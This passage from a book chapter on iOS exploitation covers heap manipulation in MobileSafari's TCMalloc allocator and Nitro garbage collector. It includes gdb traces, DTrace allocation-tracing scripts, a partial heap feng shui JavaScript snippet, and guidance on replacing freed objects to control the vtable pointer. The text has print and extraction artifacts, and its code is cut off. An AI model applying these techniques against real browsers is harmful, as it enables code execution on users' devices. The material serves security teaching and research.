through JavaScript is wrapped into a JSCell structure. The TCMalloc garbage
collector is heavily infl uenced by the Nitro behavior. In fact, until JSCells are in
use, those memory objects will not be freed.
cc0077..iinndddd 220022 44//1166//22001122 55::4466::1111 PPMM
Chapter 7 n Exploitation 203
To better understand this concept, take a look at the deallocation process of an
HTML div object inside MobileSafari. You fi rst allocate 10 HTML div objects, then
you deallocate them and use a function (in this case Math.acos) to understand from
the debugger when the deallocation is supposed to happen. Finally, you allocate a
huge number of objects and see when the actual deallocation of the object happens:
Breakpoint 6, 0x9adbc1bb in WebCore::HTMLDivElement::create ()
(gdb) info reg
eax 0x28f0c0 2683072
ecx 0x40 64
edx 0x40 64
ebx 0xc006ba88 -1073300856
esp 0xc006b2a0 0xc006b2a0
ebp 0xc006b2b8 0xc006b2b8
esi 0x9adbc1ae -1696874066
edi 0xc006ba28 -1073300952
eip 0x9adbc1bb 0x9adbc1bb
eflags 0x282 642
cs 0x1b 27
ss 0x23 35
ds 0x23 35
es 0x23 35
fs 0x0 0
gs 0xf 15
(gdb) awatch *(int *)0x28f0c0
Hardware access (read/write) watchpoint 8: *(int *) 2683072
(gdb) c
Continuing.
Hardware access (read/write) watchpoint 8: *(int *) 2683072
The div object is stored in EAX. You set a memory watchpoint on it to be able
to track it during the execution.
Breakpoint 4, 0x971f9ee5 in JSC::mathProtoFuncACos ()
(gdb)
Now you have reached the point where the object is supposed to be deallo-
cated, but the output shows that the object is still allocated as far as TCMalloc
is concerned. Continuing further you get the following:
(gdb) continue
Continuing.
Hardware access (read/write) watchpoint 8: *(int *) 2683072
Value = -1391648216
0x9ad7ee0e in WebCore::JSNodeOwner::isReachableFromOpaqueRoots ()
(gdb)
Continuing.
cc0077..iinndddd 220033 44//1166//22001122 55::4466::1111 PPMM
204 Chapter 7 n Exploitation
Hardware access (read/write) watchpoint 8: *(int *) 2683072
Value = -1391648216
0x9ad7ee26 in WebCore::JSNodeOwner::isReachableFromOpaqueRoots ()
(gdb)
Continuing.
Hardware access (read/write) watchpoint 8: *(int *) 2683072
Old value = -1391648216
New value = -1391646616
0x9b4f141c in non-virtual thunk to WebCore::HTMLDivElement::~HTMLDivElement() ()
(gdb) bt 20
#0 0x9b4f141c in non-virtual thunk to WebCore::HTMLDivElement
::~HTMLDivElement() ()
#1 0x9adf60d2 in WebCore::JSHTMLDivElement::~JSHTMLDivElement ()
#2 0x970c5887 in JSC::MarkedBlock::sweep ()
Previous frame inner to this frame (gdb could not unwind past this frame)
(gdb)
So the object is freed only after the Nitro garbage collector is invoked. It is
pretty vital, then, to understand when and how the Nitro garbage collector is
triggered.
The Nitro garbage collector is invoked in three scenarios:
n After a timeout that is set at compile time
n After the JavaScript global data are destroyed (that is, when a thread dies)
n When the number of bytes allocated exceeds a certain threshold
Clearly, the easiest option to control the garbage collector is with the third
scenario. The process is pretty much the same as the one that triggered it in
the previous example. A number of objects can be used to trigger the behavior
of the third scenario, for instance images, arrays, and strings. You see later that
in the Pwn2Own case study, strings and arrays are used, but the choice of the
object depends on the bug in question.
The next important step is to fi nd objects over which you have as much con-
trol as possible, and use those to tame the heap, and, in case of object lifetime
issues, replace the faulty object. Usually, strings and arrays fi t the purposes fi ne.
What you need to pay particular attention to, most of the time, is the ability to
control the fi rst four bytes of the object you are using for replacing the faulty
ones, because those four bytes are where the virtual function table pointer is
located, and controlling it is usually the easiest way to obtain code execution.
Tools for Debugging Heap Manipulation Code
Debugging heap manipulation code can be tricky, and no default Mac OS
X or iPhone tools offer support for TCMalloc heap debugging. Because the
cc0077..iinndddd 220044 44//1166//22001122 55::4466::1111 PPMM
Chapter 7 n Exploitation 205
implementation of TCMalloc used on the iPhone is the same one used on Mac
OS X, you can perform all the debugging needed on Mac OS X using Dtrace.
This section doesn’t cover the details of Dtrace or the D language, but presents
two scripts that ease the debugging process. These scripts will be extremely
useful for your exploitation work.
The fi rst script records allocations of all sizes and prints a stack trace:
#pragma D option mangled
BEGIN
{
printf(“let’s start with js tracing”);
}
pid$target:JavaScriptCore:__ZN3WTF10fastMallocEm:entry
{
printf(“Size %d\n”, arg0);
ustack(4);
}
The second one allows you to trace allocations and deallocations of a
specifi c size:
#pragma D option mangled
BEGIN
{
printf(“let’s start with allocation tracing”);
}
pid$target:JavaScriptCore:__ZN3WTF10fastMallocEm:entry
{
self->size = arg0;
}
pid$target:JavaScriptCore:__ZN3WTF10fastMallocEm:return
/self->size == 60/
{
printf(“Pointer 0x%x\n”, arg1);
addresses[arg1] = 1;
ustack(2);
}
pid$target:JavaScriptCore:__ZN3WTF8fastFreeEPv:entry
/addresses[arg0]/
cc0077..iinndddd 220055 44//1166//22001122 55::4466::1111 PPMM
206 Chapter 7 n Exploitation
{
addresses[arg0] = 0;
printf(“Object freed 0x%x\n”, arg0);
ustack(2);
}
The only thing you need to do to port results from Mac OS X to iOS is
determine the correct object sizes; those sizes might change between the two
versions. Doing this is relatively easy; in fact, most of the time it is possible
to locate the size of the object you are dealing with in a binary. Alternatively,
by using BinDiff on the Mac OS X and iOS WebKit binary, it is often possible
to understand the size.
Another invaluable tool when it comes to debugging heap sprays is vmmap.
This allows you to see the full content of the process address space. Grepping
for JavaScript in the vmmap output shows which regions of memory are allo-
cated by TCMalloc. Knowing common address ranges is useful when you have
to do some guesswork on addresses (for instance, when pointing a fake vtable
pointer to an attacker-controlled memory location).
In general, it is preferable when developing an exploit for iOS to debug it
using the 32-bit version of Safari on Mac OS X instead of the 64-bit one. This
way, the number of differences in terms of object sizes and allocator between
the two will be signifi cantly lowered.
Exploiting Arithmetic Vulnerabilities with
TCMalloc—Heap Feng Shu i
Armed with knowledge of the allocator, the ways to trigger the garbage collector,
and the objects to use, you can now proceed with shaping the heap.
The plan is pretty straightforward; the fi rst step is to allocate a number of
objects to defragment the heap. This is not rocket science, and depending on
the state of the heap at the beginning of the execution of the exploit, the num-
ber of objects needed may change slightly. Defragmenting the heap is pretty
important because this way it is possible to guarantee that the following objects
will be allocated consecutively in-memory. Once the heap is defragmented,
the goal is to create holes in between objects on the heap. To do so, fi rst a
bunch of objects are allocated, and then every other object is freed. At this
stage, you are all set to allocate the vulnerable object. If the defragmentation
worked as expected, the heap will contain the vulnerable object in between
two objects of your choice.
The last step is to trigger the bug and obtain code execution.
The following code snippet illustrates the process that needs to be carried
out to obtain the correct heap layout. You can use the Dtrace script shown in
cc0077..iinndddd 220066 44//1166//22001122 55::4466::1111 PPMM
Chapter 7 n Exploitation 207
the previous section to trace the allocations and verify that the JavaScript code
is working properly:
var shui = new Array(10000);
var gcForce = new Array(30000); //30000 should be enough to
trigger a garbage collection
var vulnerable = new Array(10);
function allocateObjects()
{
for(i = 0; i 
Before you can fully understand this code, you need to consider some things.
First of all, it is vital to understand the size of the vulnerable object; in this case
you are dealing with a 60-byte HTML div element. You can use different methods
to ascertain the size of the object: either trace it dynamically in a debugger, use
another Dtrace script, or statically determine it by looking at the constructor of
the object in a disassembler.
When the object size is known, the second thing you need to do is fi nd a way
to properly replace the object. Looking into the WebKit source code you can
fi nd the following code initializing a string:
PassRefPtr StringImpl::createUninitialized(
unsigned length, UChar*& data)
{
if (!length) {
data = 0;
return empty();
}
// Allocate a single buffer large enough to contain the StringImpl
// struct as well as the data which it contains. This removes one
// heap allocation from this call.
if (length > ((std::numeric_limits::max() - sizeof(StringImpl)) /
\sizeof(UChar)))
CRASH();
size_t size = sizeof(StringImpl) + length * sizeof(UChar);
StringImpl* string = static_cast(fastMalloc(size));
data = reinterpret_cast(string + 1);
return adoptRef(new (string) StringImpl(length));
}
cc0077..iinndddd 220088 44//1166//22001122 55::4466::1111 PPMM
Chapter 7 n Exploitation 209
So, it appears that an attacker can easily control the size of the allocation. In
the past, strings were even better in that the attacker had total control over the
whole content of the buffer. These days, strings turn out to be less useful because
no obvious ways exist to control the fi rst four bytes of the buffer. Nonetheless,
for the purpose of this chapter you will be using them because they can be sized
easily to fi t any vulnerable object size that might be needed.
Of particular importance is the way the length of the string is calculated:
size_t size = sizeof(StringImpl) + length * sizeof(UChar);
This tells you how many characters you need to put in your JavaScript code.
The size of SringImpl is 20 bytes, and a UChar is two bytes long. Therefore, to
allocate 60 bytes of data you need 20 characters in the JavaScript string.
At this point you are all set to verify that the code is working properly, that
is, the HTML div elements are allocated between strings.
Running this code in the browser and tracing the output with the Dtrace
script provided earlier shows the following output:
snaggs-MacBook-Air:~ snagg$sudo dtrace -s Documents/Trainings/Mac\ hacking\
training/Materials/solutions_day2/9_WebKit/traceReplace.d -p 1498 -o out2
dtrace: script ‘Documents/Trainings/Mac hacking
training/Materials/solutions_day2/9_WebKit/traceReplace.d’ matched 6 probes
dtrace: 2304 dynamic variable drops
dtrace: error on enabled probe ID 6 (
ID 28816: pid1498:JavaScriptCore:__ZN3WTF8fastFreeEPv:entry):
invalid address (0x3) in action #3
^Csnaggs-MacBook-Air:~ snagg$
snaggs-MacBook-Air:~ snagg$cat out2 | grep HTMLDiv
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS
_8DocumentE+0x1b
WebCore`__ZN7WebCore14HTMLDivElement6createERKNS_13Qualifi edNameEPNS